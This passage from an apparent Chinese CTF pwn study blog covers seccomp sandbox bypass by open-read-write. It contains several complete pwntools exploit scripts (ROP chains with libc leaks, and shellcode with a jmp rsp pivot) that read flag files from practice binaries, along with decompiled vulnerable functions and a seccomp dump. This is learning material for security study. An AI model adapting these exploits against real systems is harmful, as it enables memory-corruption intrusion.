0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">payload = shellcode</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="ROP绕过"><a href="#ROP绕过" class="headerlink" title="ROP绕过"></a>ROP绕过</h5><p>例题</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  gift();</span><br><span class="line">  init_sandbox();</span><br><span class="line">  sandboxx();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sandboxx</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the Sandbox Challenge&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe you need an open read wirte &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input your name:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will give you a nice little gift&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Leak: %p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&quot;./sandbox&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./sandbox&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">         gdb.attach(p)</span><br><span class="line">         pause()</span><br><span class="line">        </span><br><span class="line">bss=<span class="number">0x404020</span>+<span class="number">0x800</span></span><br><span class="line">sandboxx = <span class="number">0x4013ED</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">rdi=libc_base+<span class="number">0x0000000000023b6a</span> </span><br><span class="line">rsi=libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119431</span></span><br><span class="line">rsp = libc_base + <span class="number">0x000000000002f70a</span></span><br><span class="line">open_addr=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(bss)+p64(rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_addr)+p64(rsp)+p64(bss + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;name:&quot;</span>)</span><br><span class="line">p.send(payload2) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  =<span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">payload +=p64(rdi)</span><br><span class="line">payload +=p64(bss)</span><br><span class="line">payload +=p64(rsi)</span><br><span class="line">payload +=p64(<span class="number">0</span>)</span><br><span class="line">payload +=p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload +=p64(rdi)</span><br><span class="line">payload +=p64(<span class="number">3</span>)</span><br><span class="line">payload +=p64(rsi)</span><br><span class="line">payload +=p64(bss+<span class="number">0x600</span>)</span><br><span class="line">payload +=p64(rdx_r12)</span><br><span class="line">payload +=p64(<span class="number">0x100</span>)*<span class="number">2</span></span><br><span class="line">payload +=p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload +=p64(rdi)</span><br><span class="line">payload +=p64(<span class="number">1</span>)</span><br><span class="line">payload +=p64(rsi)</span><br><span class="line">payload +=p64(bss+<span class="number">0x600</span>)</span><br><span class="line">payload +=p64(rdx_r12)</span><br><span class="line">payload +=p64(<span class="number">0x100</span>)*<span class="number">2</span></span><br><span class="line">payload +=p64(write_addr) </span><br><span class="line">payload +=p64(sandboxx )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>
+
+<p>江西省赛</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;&quot;</span>,<span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *$rebase(0x19f2)</span></span><br><span class="line"><span class="string">set debug-file-directory /home/zacsn/.config/cpwn/pkgs/2.31-</span></span><br><span class="line"><span class="string">0ubuntu9.17/amd64/libc6-dbg_2.31-0ubuntu9.17_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/zacsn/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/glibcsource_2.31-0ubuntu9.17_all/usr/src/glibc/glibc-2.31</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> : io.recvline()</span><br><span class="line">rn = <span class="keyword">lambda</span> counts : io.recvn(counts)</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">iuu32 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">iuu64 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">uheap = <span class="keyword">lambda</span> : u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"><span class="comment">#gdb.debug(elf.path,gdbscript=gs)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,gdbscript = gs)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004013d3</span></span><br><span class="line">ru(<span class="string">b&quot;hello sandbox!&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x4012f9</span>)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">puts_addr = u64(rn(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">lg(<span class="string">&quot;puts_addr&quot;</span>)</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc_addr&quot;</span>)</span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rsi = libc_addr + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_addr + <span class="number">0x0000000000142c92</span></span><br><span class="line">pop_rax = libc_addr + <span class="number">0x0000000000036174</span></span><br><span class="line">syscall = libc_addr+libc.search(asm(<span class="string">&quot;&quot;&quot;syscall;ret&quot;&quot;&quot;</span>)).__next__()</span><br><span class="line">bss_addr = <span class="number">0x404200</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;hello sandbox!&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(<span class="number">0x10</span>) + p64(read_addr)</span><br><span class="line">payload2 += p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">payload2 += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(bss_addr + <span class="number">0x100</span>) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line">payload2 += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(bss_addr + <span class="number">0x100</span>) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">b&quot;./flag\x00\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+
+<p>今天先写到这✍️，以后还会接着写📖，但是明天就要开始着手学堆了🔥，不然很多比赛都打不了🏆💪。</p>
+<h2 id="ctfshow-pwn69"><a href="#ctfshow-pwn69" class="headerlink" title="ctfshow pwn69"></a>ctfshow pwn69</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now you can use ORW to do&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No you don&#x27;t understand I say!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>可以看到orw是可以的，所以我们要先利用read将orw读到</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="string">&#x27;28191&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode = asm(orw_shellcode)</span><br><span class="line"></span><br><span class="line">jmp_rsp_addr = <span class="number">0x400a01</span></span><br><span class="line">buf_shellcode = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>)) + asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line">buf_shellcode = buf_shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">buf_shellcode += p64(jmp_rsp_addr) + asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;do&#x27;</span>)</span><br><span class="line">p.sendline(buf_shellcode)</span><br><span class="line">p.sendline(orw_shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这一部分是标准的orw</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode = asm(orw_shellcode)</span><br></pre></td></tr></table></figure>
+
+<p>这部分我来详细解释一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf_shellcode = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>)) + asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line">buf_shellcode = buf_shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">buf_shellcode += p64(jmp_rsp_addr) + asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p> asm(shellcraft.read(0,mmap,100)):这是汇编代码，用于调用read系统调用，从标准输入读取最多100字节的数据到地址0x123000。</p>
+<p>asm(“mov rax,0x123000; jmp rax”)：先将0x123000放入rax，然后jmp rax执行shellcode,为什么是sellcode呢等下再说。</p>
+<p>p64(jmp_rsp_addr)：将返回地址覆盖成jmp rsp,此时程序跳转到 <code>rsp</code> 指向的位置,即 <code>asm(&quot;sub rsp, 0x30; jmp rsp&quot;)</code>因为pop ebp后rsp</p>
+<p>增高0x08。</p>
+<p>asm(“sub rsp,0x30; jmp rsp”):sub rsp,0x30使得rsp减0x30到达了buf的起始位置，jmp rsp就开始执行了。</p>
+<p>然后我来看看整个流程。</p>
+<p>p.sendline(buf_shellcode)后,栈上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read(0,mmap,100)</span><br><span class="line">buf_shellcode.ljust(0x28,b&#x27;\x00&#x27;)</span><br><span class="line">p64(jmp_rsp_addr)   # return_addr</span><br><span class="line">asm(&quot;sub rsp,0x30; jmp rsp&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>有第二部分的分析我们知道rsp此时已经达到buf的起始位置开始执行read了，所以我们才有第二次send。</p>
+<p>我们把标准的orw输入后，同理rsp又会回到起始位置开始执行orw，最终得到flag。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>linkpwn
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/" title="sandbox专题学习">http://linkpwn.github.io/2025/06/29/sandbox专题学习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/" rel="prev" title="栈迁移专题学习">
+      <i class="fa fa-chevron-left"></i> 栈迁移专题学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/" rel="next" title="格式化字符串专题加强">
+      格式化字符串专题加强 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">sandbox专题学习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#orw"><span class="nav-number">1.1.</span> <span class="nav-text">orw</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E7%94%A8orw"><span class="nav-number">1.1.1.</span> <span class="nav-text">什么时候用orw</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#orw%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.1.2.</span> <span class="nav-text">orw是什么</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sandbox%E7%9A%84%E5%BC%80%E5%90%AF"><span class="nav-number">1.1.3.</span> <span class="nav-text">sandbox的开启</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#seccomp-tools%E6%9F%A5%E7%9C%8B%E6%B2%99%E7%AE%B1"><span class="nav-number">1.1.4.</span> <span class="nav-text">seccomp-tools查看沙箱</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#open%E3%80%81read%E3%80%81write%E5%87%BD%E6%95%B0%E7%9A%84%E4%BA%86%E8%A7%A3"><span class="nav-number">1.2.</span> <span class="nav-text">open、read、write函数的了解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%81%9A%E5%AE%8C%E4%BA%86%E9%93%BA%E5%9E%AB%EF%BC%8C%E7%8E%B0%E5%9C%A8%E5%B0%B1%E5%BC%80%E5%A7%8Borw"><span class="nav-number">1.2.1.</span> <span class="nav-text">做完了铺垫，现在就开始orw</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#shellcode%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">shellcode绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ROP%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">ROP绕过</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctfshow-pwn69"><span class="nav-number">2.</span> <span class="nav-text">ctfshow pwn69</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="linkpwn"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">linkpwn</p>
+  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">43</span>
